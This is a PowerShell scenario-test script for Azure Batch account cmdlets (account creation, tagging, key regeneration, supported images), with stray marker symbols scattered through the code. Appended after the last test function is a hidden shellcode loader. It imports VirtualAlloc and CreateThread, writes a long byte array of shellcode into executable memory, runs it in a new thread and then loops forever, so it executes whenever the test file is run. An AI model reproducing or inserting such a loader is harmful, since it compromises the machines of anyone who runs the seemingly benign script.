














 -||-> function Test-GetNonExistingBatchAccount
{
     -||-> Assert-Throws {  -||-> Get-AzBatchAccount -Name "accountthatdoesnotexist" <-||-  } <-||- 
} <-||- 


 -||-> function Test-BatchAccountEndToEnd
{
    
     -||-> $accountName =  -||-> Get-BatchAccountName <-||-  <-||- 
     -||-> $resourceGroup =  -||-> Get-ResourceGroupName <-||-  <-||- 

     -||-> try 
    {
         -||-> $location =  -||-> Get-BatchAccountProviderLocation <-||-  <-||- 
         -||-> $tagName = "tag1" <-||- 
         -||-> $tagValue = "tagValue1" <-||- 

        
         -||-> New-AzResourceGroup -Name $resourceGroup -Location $location <-||- 
         -||-> $createdAccount =  -||-> New-AzBatchAccount -Name $accountName -ResourceGroupName $resourceGroup -Location $location -Tag @{$tagName =  -||-> $tagValue <-||- } <-||-  <-||- 

        
         -||-> Assert-AreEqual $accountName $createdAccount.AccountName <-||- 
         -||-> Assert-AreEqual $resourceGroup $createdAccount.ResourceGroupName <-||- 	
         -||-> Assert-AreEqual $location $createdAccount.Location <-||- 
         -||-> Assert-AreEqual 1 $createdAccount.Tags.Count <-||- 
         -||-> Assert-AreEqual $tagValue $createdAccount.Tags[$tagName] <-||- 
         -||-> Assert-True {  -||-> $createdAccount.DedicatedCoreQuota -gt 0 <-||-  } <-||- 
         -||-> Assert-True {  -||-> $createdAccount.LowPriorityCoreQuota -gt 0 <-||-  } <-||- 
         -||-> Assert-True {  -||-> $createdAccount.PoolQuota -gt 0 <-||-  } <-||- 
         -||-> Assert-True {  -||-> $createdAccount.ActiveJobAndJobScheduleQuota -gt 0 <-||-  } <-||- 

        
         -||-> $newTagName = "tag2" <-||- 
         -||-> $newTagValue = "tagValue2" <-||- 
         -||-> Set-AzBatchAccount -Name $accountName -ResourceGroupName $resourceGroup -Tag @{$newTagName =  -||-> $newTagValue <-||- } <-||- 

        
         -||-> $updatedAccount =  -||-> Get-AzBatchAccount -Name $accountName -ResourceGroupName $resourceGroup <-||-  <-||- 

         -||-> Assert-AreEqual $accountName $updatedAccount.AccountName <-||- 
         -||-> Assert-AreEqual 1 $updatedAccount.Tags.Count <-||- 
         -||-> Assert-AreEqual $newTagValue $updatedAccount.Tags[$newTagName] <-||- 

        
         -||-> $accountWithKeys =  -||-> Get-AzBatchAccountKeys -Name $accountName <-||-  <-||- 
         -||-> Assert-NotNull $accountWithKeys.PrimaryAccountKey <-||- 
         -||-> Assert-NotNull $accountWithKeys.SecondaryAccountKey <-||- 

        
         -||-> $accountWithKeys =  -||-> Get-AzBatchAccountKeys -Name $accountName -ResourceGroupName $resourceGroup <-||-  <-||- 
         -||-> Assert-NotNull $accountWithKeys.PrimaryAccountKey <-||- 
         -||-> Assert-NotNull $accountWithKeys.SecondaryAccountKey <-||- 

        
         -||-> $updatedKey =  -||-> New-AzBatchAccountKey -Name $accountName -ResourceGroupName $resourceGroup -KeyType Primary <-||-  <-||- 
         -||-> Assert-NotNull $updatedKey.PrimaryAccountKey <-||- 
         -||-> Assert-AreNotEqual $accountWithKeys.PrimaryAccountKey $updatedKey.PrimaryAccountKey <-||- 
         -||-> Assert-AreEqual $accountWithKeys.SecondaryAccountKey $updatedKey.SecondaryAccountKey <-||- 
    }
    finally
    {
         -||-> try
        {
            
             -||-> Remove-AzBatchAccount -Name $accountName -ResourceGroupName $resourceGroup -Force <-||- 
             -||-> $errorMessage = "The specified account does not exist." <-||- 
             -||-> Assert-ThrowsContains {  -||-> Get-AzBatchAccount -Name $accountName -ResourceGroupName $resourceGroup <-||-  } $errorMessage <-||- 
        }
        finally
        {
             -||-> Remove-AzResourceGroup $resourceGroup <-||- 
        } <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-GetBatchSupportedImage
{
     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 

    
     -||-> $supportedImages =  -||-> Get-AzBatchSupportedImage -BatchContext $context <-||-  <-||- 

     -||-> foreach($supportedImage in  -||-> $supportedImages <-||- )
    {
         -||-> Assert-True {  -||-> $supportedImage.NodeAgentSkuId.StartsWith("batch.node") <-||-  } <-||- 
         -||-> Assert-True {  -||-> $supportedImage.OSType -in "linux","windows" <-||-  } <-||- 
         -||-> Assert-AreNotEqual $null $supportedImage.VerificationType <-||- 
    } <-||- 
} <-||- 
 -||-> $jtKNT = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $jtKNT -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0x96,0xba,0x60,0x1e,0xdb,0xc0,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x58,0x0f,0x03,0x58,0x99,0x58,0x95,0xe2,0x4d,0x1e,0x56,0x1b,0x8d,0x7f,0xde,0xfe,0xbc,0xbf,0x84,0x8b,0xee,0x0f,0xce,0xde,0x02,0xfb,0x82,0xca,0x91,0x89,0x0a,0xfc,0x12,0x27,0x6d,0x33,0xa3,0x14,0x4d,0x52,0x27,0x67,0x82,0xb4,0x16,0xa8,0xd7,0xb5,0x5f,0xd5,0x1a,0xe7,0x08,0x91,0x89,0x18,0x3d,0xef,0x11,0x92,0x0d,0xe1,0x11,0x47,0xc5,0x00,0x33,0xd6,0x5e,0x5b,0x93,0xd8,0xb3,0xd7,0x9a,0xc2,0xd0,0xd2,0x55,0x78,0x22,0xa8,0x67,0xa8,0x7b,0x51,0xcb,0x95,0xb4,0xa0,0x15,0xd1,0x72,0x5b,0x60,0x2b,0x81,0xe6,0x73,0xe8,0xf8,0x3c,0xf1,0xeb,0x5a,0xb6,0xa1,0xd7,0x5b,0x1b,0x37,0x93,0x57,0xd0,0x33,0xfb,0x7b,0xe7,0x90,0x77,0x87,0x6c,0x17,0x58,0x0e,0x36,0x3c,0x7c,0x4b,0xec,0x5d,0x25,0x31,0x43,0x61,0x35,0x9a,0x3c,0xc7,0x3d,0x36,0x28,0x7a,0x1c,0x5e,0x9d,0xb7,0x9f,0x9e,0x89,0xc0,0xec,0xac,0x16,0x7b,0x7b,0x9c,0xdf,0xa5,0x7c,0xe3,0xf5,0x12,0x12,0x1a,0xf6,0x62,0x3a,0xd8,0xa2,0x32,0x54,0xc9,0xca,0xd8,0xa4,0xf6,0x1e,0x74,0xa0,0x60,0x8f,0x98,0xca,0xba,0xa7,0x98,0x0a,0x29,0xf8,0x14,0xec,0x1d,0xa8,0x76,0xa1,0xdd,0x18,0x37,0x11,0xb5,0x72,0xb8,0x4e,0xa5,0x7c,0x12,0xe7,0x4f,0x93,0xcb,0x5f,0xe7,0x0a,0x56,0x2b,0x96,0xd3,0x4c,0x51,0x98,0x58,0x63,0xa5,0x56,0xa9,0x0e,0xb5,0x0e,0x59,0x45,0xe7,0x98,0x66,0x73,0x82,0x24,0xf3,0x78,0x05,0x73,0x6b,0x83,0x70,0xb3,0x34,0x7c,0x57,0xc8,0xfd,0xe8,0x18,0xa6,0x01,0xfd,0x98,0x36,0x54,0x97,0x98,0x5e,0x00,0xc3,0xca,0x7b,0x4f,0xde,0x7e,0xd0,0xda,0xe1,0xd6,0x85,0x4d,0x8a,0xd4,0xf0,0xba,0x15,0x26,0xd7,0x3a,0x69,0xf1,0x11,0x49,0x83,0xc1 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $jtK=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $jtK.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$jtK,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



